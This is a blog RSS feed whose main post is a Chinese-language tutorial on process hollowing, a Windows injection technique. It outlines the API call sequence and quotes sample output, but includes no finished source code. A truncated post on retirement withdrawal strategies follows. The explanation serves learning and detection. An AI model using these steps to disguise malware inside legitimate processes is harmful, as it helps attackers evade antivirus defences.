<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>呂晟維 - luweber88.github.io</title>
        <link>https://weberlu88.github.io/</link>
        <description>Recent content on 呂晟維 - luweber88.github.io</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Thu, 14 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://weberlu88.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>資安攻擊技法 - Process Hollowing</title>
        <link>https://weberlu88.github.io/p/process-hollowing/</link>
        <pubDate>Thu, 14 Oct 2021 00:00:00 +0000</pubDate>
        
        <guid>https://weberlu88.github.io/p/process-hollowing/</guid>
        <description>&lt;p&gt;這篇文章將會介紹 Process Hollowing 的原理並輔以程式碼片段加以解說。 根據 Mitre att&amp;amp;ck 的分類，Process Hollowing 是 Process Injection 的一門子類別，又可稱為 cross-process injection。這次的程式展示將以 Windows 作業系統為目標，Windows 的執行檔統稱 portable executables (PE)，因此此項技法又名為 Portable Executable Injection。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Tactics: Privilege Escalation, Defense Evasion
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Techniques: Process Injection
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;什麼是-process-hollowing&#34;&gt;什麼是 Process Hollowing&lt;/h2&gt;
&lt;p&gt;Process Hollowing 是將惡意程式碼植入至 suspended 的 Process (執行緒)，達到可執行任意程式碼(arbitrary code execution)的目的，藉此偽裝被劫持的執行緒，繞過防毒軟體、應用程式偵測等防禦機制。最常見的範例是攻擊者自行 spawn 一個正常的 process，如 cmd.exe、svchost.exe，並且直接將其設為 suspend mode。&lt;/p&gt;
&lt;p&gt;接下來有兩種做法，一是將惡意程式寫入原本 process 的 Image 中，二是另外分配一段記憶體給惡意程式再將原本 process 的 ImageBase 和 EntryPoint 指向新分配到的記憶體。最後攻擊者將 process 恢復執行即可掛羊頭賣狗肉的執行惡意程式了。&lt;/p&gt;
&lt;p&gt;要注意的是，Process Hollowing 的權限是依據當前使用者的權限，或繼承父執行緒權限。若我們只 compromise 到一般使用者的帳號或執行階段(Session)，則只能獲得該使用者的權限。&lt;/p&gt;
&lt;p&gt;技高一籌的攻擊行為是 Hijacking，攻擊者必須找到由 system admin 執行的 process 並且嘗試植入惡意程式，藉此獲得 admin 權限；找到 admin 權限的執行緒很容易，Hijacking 的精隨在於如何讓執行中的 process 進入 suspend mode 並知道它的 Image section 以 inject。&lt;/p&gt;
&lt;p&gt;在教學之前，以些情境與名詞要先定義好:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Executable&lt;/strong&gt;: Executable is a compiled form of a Program (HelloWorld.exe file) &lt;a class=&#34;link&#34; href=&#34;https://stackoverflow.com/questions/12999850/what-are-the-differences-between-a-program-an-executable-and-a-process&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;[i]&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Process&lt;/strong&gt;: Process is the executable being run by OS (an active program). The one you see in Task Manager or Task List (HelloWord.exe Process when we double click it.) &lt;a class=&#34;link&#34; href=&#34;https://stackoverflow.com/questions/12999850/what-are-the-differences-between-a-program-an-executable-and-a-process&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;[i]&lt;/a&gt; Process (行程)本身不是基本執行單位，而是Thread (執行緒)的容器。Process 需要資源才能完成工作，如CPU、記憶體、檔案以及I/O裝置。&lt;a class=&#34;link&#34; href=&#34;https://totoroliu.medium.com/program-process-thread-%E5%B7%AE%E7%95%B0-4a360c7345e5&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;[ii]&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Thread&lt;/strong&gt;: 略。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Image / Process image&lt;/strong&gt;: 執行檔運行後被載入至記憶體(RAM)時，這個記憶體區塊便稱為 Image。Executable files are loaded into the address space of a process using a memory mapped image file. &lt;a class=&#34;link&#34; href=&#34;https://www.tutorialspoint.com/inter_process_communication/inter_process_communication_process_image.htm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;[i]&lt;/a&gt; &lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/executable-images&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;[ii]&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Source image&lt;/strong&gt;: The memory space of malicious process. (&lt;em&gt;virus&lt;/em&gt;)
&lt;ul&gt;
&lt;li&gt;Source = Mallicious code = Malware = 惡意程式。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Destination image&lt;/strong&gt;: The memory space of a legitimate process spawned by adversary. It is the target to be injected. (&lt;em&gt;victim&lt;/em&gt;)
&lt;ul&gt;
&lt;li&gt;Destination = Target。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ImageBase&lt;/strong&gt;: Image file 的起始位址。 The preferred address of the first byte of the image when it is loaded in memory. The default value for DLLs is 0x10000000. The default value for applications is 0x00400000. &lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;[i]&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;EntryPoint&lt;/strong&gt;: Image file 的進入點位址，也就是 stackframe of main 的起始位址。The address to the entry point function of the process/image. &lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;[i]&lt;/a&gt; The location in memory where the first instruction of execution will be placed. &lt;a class=&#34;link&#34; href=&#34;https://en.redinskala.com/finding-the-ep/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;[ii]&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;EntryPoint&lt;/strong&gt; = &lt;strong&gt;ImageBase&lt;/strong&gt; + &lt;strong&gt;AddressOfEntryPoint&lt;/strong&gt; (offset)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;關於更多關於 PE file 的知識可以參考下方介紹。&lt;/p&gt;
&lt;h2 id=&#34;逐步拆解-process-hollowing-的運作&#34;&gt;逐步拆解 Process Hollowing 的運作&lt;/h2&gt;
&lt;h3 id=&#34;簡略流程&#34;&gt;簡略流程&lt;/h3&gt;
&lt;p&gt;我們來看看 MicroSoft 對於 Process Hollowing 的介紹。&lt;/p&gt;
&lt;p&gt;原文👉 &lt;a class=&#34;link&#34; href=&#34;https://www.microsoft.com/security/blog/2017/07/12/detecting-stealthier-cross-process-injection-techniques-with-windows-defender-atp-process-hollowing-and-atom-bombing/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Process hollowing and atom bombing&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;While there are few known techniques that achieve process hollowing, the most common variant typically follows &lt;strong&gt;four steps&lt;/strong&gt; to achieve stealthy execution of malicious code:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The malware &lt;strong&gt;spawns a new instance of a legitimate process&lt;/strong&gt; (e.g., explorer.exe, lsass.exe, etc.), and places it in a &lt;strong&gt;suspended state&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;The malware then &lt;strong&gt;hollows out the memory section&lt;/strong&gt; in the new (and still suspended) process that holds the &lt;strong&gt;base address&lt;/strong&gt; of the legitimate code. To do this, the malware uses the &lt;em&gt;NtUnmapViewOfSection&lt;/em&gt; routine.&lt;/li&gt;
&lt;li&gt;It allocates &lt;strong&gt;read-write-execute (RWX) memory&lt;/strong&gt; in the suspended process to prepare for the replacement malicious code.&lt;/li&gt;
&lt;li&gt;The malware then &lt;strong&gt;copies malicious code&lt;/strong&gt; into the allocated memory. It changes the target address of the &lt;strong&gt;first thread&lt;/strong&gt; to the malicious program’s &lt;strong&gt;entry point&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;When the thread resumes, the malicious code starts running, now disguised as a legitimate process. The malware is then free to delete remnants of itself from disk to avoid detection.&lt;/p&gt;
&lt;h3 id=&#34;詳細流程&#34;&gt;詳細流程&lt;/h3&gt;
&lt;p&gt;這篇引用 Autosectools.com 的 PDF 文件做更詳細的介紹。我們直接來看範例程式的輸出結果(stdout)來回推過程，其實不論是攻擊思路和程式都很直觀。&lt;/p&gt;
&lt;p&gt;原文👉 &lt;a class=&#34;link&#34; href=&#34;https://www.autosectools.com/process-hollowing.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.autosectools.com/process-hollowing.pdf&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 151; 
			flex-basis: 362px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/process-hollowing/img-bootstrap.png&#34; data-size=&#34;1045x691&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/process-hollowing/img-bootstrap.png&#34;
			width=&#34;1045&#34;
			height=&#34;691&#34;
			srcset=&#34;https://weberlu88.github.io/p/process-hollowing/img-bootstrap_hu0e491712396ea75bf4699d8b30dc4c4c_76100_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/process-hollowing/img-bootstrap_hu0e491712396ea75bf4699d8b30dc4c4c_76100_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Process Hollowing 的架構概念圖&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Process Hollowing 的架構概念圖&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Creating destination process&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Adversary 以合法的方式開啟一個 target process，並以 suspended state 執行。由於 target process 是我們親手建立的因此可以掌握它完整的資訊(PROCESS_INFORMATION)，如 pid 和 handle 等資訊。因為我們等等需要把 target process 跟它的記憶體區塊脫鉤，也要讀取它在 register 中的資訊，因此直接讓它進入 suspended state，待我們 inject 惡意程式之後再啟動它。&lt;/p&gt;
&lt;p&gt;備註:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Handle&lt;/em&gt; is a reference to a process。&lt;a class=&#34;link&#34; href=&#34;https://stackoverflow.com/questions/12424045/what-is-the-difference-between-handle-and-thread&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;[i]&lt;/a&gt; &lt;a class=&#34;link&#34; href=&#34;https://en.wikipedia.org/wiki/Handle_%28computing%29&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;[ii]&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Process Creation Flags&lt;/em&gt;: CREATE_SUSPENDED - The primary thread of the new process is created in a suspended state, and does not run until the &lt;em&gt;ResumeThread&lt;/em&gt; function is called.。&lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;[i]&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 177; 
			flex-basis: 425px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/process-hollowing/img-states_modified.png&#34; data-size=&#34;856x483&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/process-hollowing/img-states_modified.png&#34;
			width=&#34;856&#34;
			height=&#34;483&#34;
			srcset=&#34;https://weberlu88.github.io/p/process-hollowing/img-states_modified_hu0bc9acbd06f817ef4007aea69482c779_45531_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/process-hollowing/img-states_modified_hu0bc9acbd06f817ef4007aea69482c779_45531_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;States of a Process in Operating Systems (from www.geeksforgeeks.org)&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;States of a Process in Operating Systems (from &lt;a class=&#34;link&#34; href=&#34;https://www.geeksforgeeks.org&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;www.geeksforgeeks.org&lt;/a&gt;)&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Opening source file&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;讀入 source PE file (惡意程式碼的執行檔)。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Unmapping destination section&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用 C++ 的 &lt;code&gt;NtUnmapViewOfSection()&lt;/code&gt; 方法將 target process 先前分配給行程的記憶體 unmap 掉。在第 8, 9 步我們會將 target process 的 memory section 指向第 2 步載入的惡意程式的 image。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Allocating memory&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;接下來我們要使用 &lt;code&gt;VirtualAllocEx()&lt;/code&gt;方法要求另一塊記憶體空間給 source process (要植入的惡意程式)。在 PE file 的 optional header 中，SizeOfImage 這個欄位會記錄 image 所需的記憶體大小，我們就依照這個欄位來分配新的記憶體給 source process。&lt;/p&gt;
&lt;p&gt;一般來說記憶體為了安全會依照可讀/可寫/可執行的用途來分配給不同 section，但我們簡化流程直接指定為可讀+可寫+可執行(RWX)。如果需要做到更好的偽裝則需按照 section 來分配不同安全層級的記憶體。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Source image base: 0x00400000&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Destination image base: 0x00A60000&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Relocation delta: 0x00660000&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;有了記憶體空間，接下來要將 source image 的內容(&lt;em&gt;malware&lt;/em&gt;)，複製到 destination image 上(&lt;em&gt;victim&lt;/em&gt;)。需要經過兩階段才能複製完成整個 image，首先要複製 image 的 header，才能根據 header 的資訊複製各個 PE file section。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Writing headers&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在程式中，我們透過 &lt;code&gt;GetNTHeaders()&lt;/code&gt; 函數的回傳值拿到一個 &lt;code&gt;PIMAGE_NT_HEADERS32 pSourceHeaders&lt;/code&gt; pointer 指向表頭。&lt;/p&gt;
&lt;p&gt;如下圖所示，我們要將 source header 複製一份寫入 destination header，但小等一下，由於 PE 表頭的 &lt;code&gt;OptionalHeader.ImageBase&lt;/code&gt; 欄位還記錄著 source 的 imageBase，必須把他改成 destination 的 imageBase 才能複製表頭，因為最後要 run 的是還是 victim process。&lt;/p&gt;
&lt;p&gt;而我們用 dwDelta (一個 dword 整數)紀錄 source imageBase 與 destination imageBase 兩者的位址差，下一步驟複製 section 時會用到這個偏移量。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 199; 
			flex-basis: 478px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/process-hollowing/img-delta.png&#34; data-size=&#34;4000x2008&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/process-hollowing/img-delta.png&#34;
			width=&#34;4000&#34;
			height=&#34;2008&#34;
			srcset=&#34;https://weberlu88.github.io/p/process-hollowing/img-delta_hu1ea6dffa76ab7e38844a7d17ce626e40_220966_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/process-hollowing/img-delta_hu1ea6dffa76ab7e38844a7d17ce626e40_220966_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;左邊是 source，要植入進右邊 destination&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;左邊是 source，要植入進右邊 destination&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;BTW，這篇教學在寫入記憶體時一律呼叫 &lt;code&gt;WriteProcessMemory()&lt;/code&gt; 方法。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Writing sections&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Writing &lt;em&gt;.text&lt;/em&gt; section to 0x00A8B000&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Writing &lt;em&gt;.rdata&lt;/em&gt; section to 0x00AE2000&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Writing &lt;em&gt;.data&lt;/em&gt; section to 0x00AF3000&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Writing &lt;em&gt;.idata&lt;/em&gt; section to 0x00AF7000&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Writing &lt;em&gt;.rsrc&lt;/em&gt; section to 0x00AF8000&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Writing &lt;em&gt;.reloc&lt;/em&gt; section to 0x00AF9000&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在程式中，我們透過 &lt;code&gt;GetLoadedImage()&lt;/code&gt; 函數的回傳值拿到一個 &lt;code&gt;PLOADED_IMAGE pSourceImage&lt;/code&gt; &lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/dbghelp/ns-dbghelp-loaded_image&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;pointer&lt;/a&gt; 指向存有 image 各項資訊的結構。從結構中可獲取 &lt;code&gt;NumberOfSections&lt;/code&gt; 的整數表示 image 中有幾個 section，以及 &lt;code&gt;Sections&lt;/code&gt; 指標指向了 &lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_section_header&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;IMAGE_SECTION_HEADER&lt;/a&gt; 結構。&lt;/p&gt;
&lt;p&gt;接著跟寫入表頭的方式一樣，使用 for-loop 依序把每個 image section 複製給 destination 即可。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Rebasing image&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;這裡我看不懂，只知道如果偏移量存在(不等於零)要做這段與 relocation section 有關的操做。需要進行多次小片段的讀寫，會先呼叫 ReadProcessMemory()，再呼叫 WriteProcessMemory()。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Getting thread context&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Setting thread context&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;成功將 Mallicious code 植入進 destination image 了!! 但此時這個這個 process 是被 suspended 的，OS 會把這個 thread 的執行資訊(如:register暫存器的值以及program counter)保存起來放在 process control block (PCB) 的 &lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;thread context&lt;/a&gt; 中，好讓該 thread 在被 CPU 再次執行時 resume 回先前的狀態，此動作稱為 context switch。&lt;/p&gt;
&lt;p&gt;當一個 process 被 swap 進 suspended state 時，EAX register&lt;a class=&#34;link&#34; href=&#34;https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;[i]&lt;/a&gt;&lt;a class=&#34;link&#34; href=&#34;https://zh.wikibooks.org/zh-tw/X86_%E6%B1%87%E7%BC%96/X86_%E6%9E%B6%E6%9E%84&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;[ii]&lt;/a&gt; 的值會被當作/設為該執行緒的 EntryPoint。因此需要修改 thread context 裡的 EAX register 為植入後程式的 EntryPoint 之絕對位置 (EntryPoint = ImageBase + AddresssOfEntryPoint)。&lt;/p&gt;
&lt;p&gt;程式中的做法是 new 一個新的 context structure 來複製原本的 context 內容，將 EAX register 改成 source image (mallicious code) 的 EntryPoint；再把 context set 回去 destination image，讓執行緒重啟時能抓到並從 mallicious code&amp;rsquo;s EntryPoint 從頭開始執行植入的程式，達到任意執行程式碼的攻擊成果。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Resuming thread&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;要重啟 process 很簡單，呼叫 &lt;code&gt;ResumeThread()&lt;/code&gt; 函數就好啦。OS 會把該行程加進 ready queue 等候執行。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Process hollowing complete&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我們的 cross-process injection 便大功告成囉，感謝各位的耐心收看! 有勘誤也歡迎指正。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;pe-file-介紹&#34;&gt;PE file 介紹&lt;/h2&gt;
&lt;p&gt;待補&lt;/p&gt;
&lt;h2 id=&#34;程式碼展示&#34;&gt;程式碼展示&lt;/h2&gt;
&lt;p&gt;待補，可能會寫在上方流程裡&lt;/p&gt;
&lt;h2 id=&#34;process-hollowing-所受的限制&#34;&gt;Process Hollowing 所受的限制&lt;/h2&gt;
&lt;p&gt;待補&lt;/p&gt;
&lt;h2 id=&#34;qas&#34;&gt;QAs&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Q: 既然 Source image 會被覆寫掉為何要先 unmap 掉原本的記憶體空間?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A: &lt;em&gt;因為原先的記憶體會有不同的 memory protection，比如說 .text section (which holds program code) 是 execute/readonly，兩邊的 section 大小不一置的話會有權限不符的情況發生。另外若 source image size &amp;lt; dest 的話覆寫完還會有記憶體殘值留下。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Q: 為何 EAX register 存放著 process 的進入點?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A: &lt;em&gt;我不知道也查不到😢，c++和C#版的兩篇教學文都這樣說。&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;參考&#34;&gt;參考&lt;/h2&gt;
&lt;p&gt;技術文章與實作 (超推必看)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.microsoft.com/security/blog/2017/07/12/detecting-stealthier-cross-process-injection-techniques-with-windows-defender-atp-process-hollowing-and-atom-bombing/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Detecting stealthier cross-process injection techniques with Windows Defender ATP: Process hollowing and atom bombing&lt;/a&gt;, &lt;a class=&#34;link&#34; href=&#34;https://www.microsoft.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;www.microsoft.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;autosectools.com&amp;rsquo;s PDF: &lt;a class=&#34;link&#34; href=&#34;https://www.autosectools.com/process-hollowing.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.autosectools.com/process-hollowing.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;C++ version: &lt;a class=&#34;link&#34; href=&#34;https://github.com/m0n0ph1/Process-Hollowing&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/m0n0ph1/Process-Hollowing&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;C# version: &lt;a class=&#34;link&#34; href=&#34;https://github.com/wireless90/ProcessInjector.NET/tree/main/ProcessInjector/ProcessHollowing&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/wireless90/ProcessInjector.NET/tree/main/ProcessInjector/ProcessHollowing&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Mitre Attack&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Process Injection &lt;a class=&#34;link&#34; href=&#34;https://attack.mitre.org/techniques/T1055/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://attack.mitre.org/techniques/T1055/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Process Injection: Process Hollowing: &lt;a class=&#34;link&#34; href=&#34;https://attack.mitre.org/techniques/T1055/012/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://attack.mitre.org/techniques/T1055/012/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Process Injection: Portable Executable Injection: &lt;a class=&#34;link&#34; href=&#34;https://attack.mitre.org/techniques/T1055/002/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://attack.mitre.org/techniques/T1055/002/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Process State&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.geeksforgeeks.org/states-of-a-process-in-operating-systems/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.geeksforgeeks.org/states-of-a-process-in-operating-systems/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Threading&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Threads &amp;amp; Threading: &lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/dotnet/standard/threading/threads-and-threading&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://docs.microsoft.com/en-us/dotnet/standard/threading/threads-and-threading&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Thread context: &lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Context switch: &lt;a class=&#34;link&#34; href=&#34;https://en.wikipedia.org/wiki/Context_switch&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://en.wikipedia.org/wiki/Context_switch&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Register&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://zh.wikibooks.org/zh-tw/X86_%E6%B1%87%E7%BC%96/X86_%E6%9E%B6%E6%9E%84&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://zh.wikibooks.org/zh-tw/X86_%E6%B1%87%E7%BC%96/X86_%E6%9E%B6%E6%9E%84&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>高通膨年代，退休金「黃金4%法則」=&gt;「動態提領策略」</title>
        <link>https://weberlu88.github.io/p/updating-4-retire-rule/</link>
        <pubDate>Wed, 13 Oct 2021 00:00:00 +0000</pubDate>
        
        <guid>https://weberlu88.github.io/p/updating-4-retire-rule/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;引用原文👉 &lt;a class=&#34;link&#34; href=&#34;https://www.gvm.com.tw/article/83033&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;退休金「黃金4%法則」慘被打臉？高通膨年代得改用「這策略」！ | 2021-10-06&lt;/a&gt;&lt;br&gt;
分析報告👉 &lt;a class=&#34;link&#34; href=&#34;https://personal.vanguard.com/pdf/ISGFIRE.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://personal.vanguard.com/pdf/ISGFIRE.pdf&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;讀者觀點，我們能從這篇文章學到甚麼?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;退休金的4%黃金法則&lt;/li&gt;
&lt;li&gt;退休金的動態提領策略&lt;/li&gt;
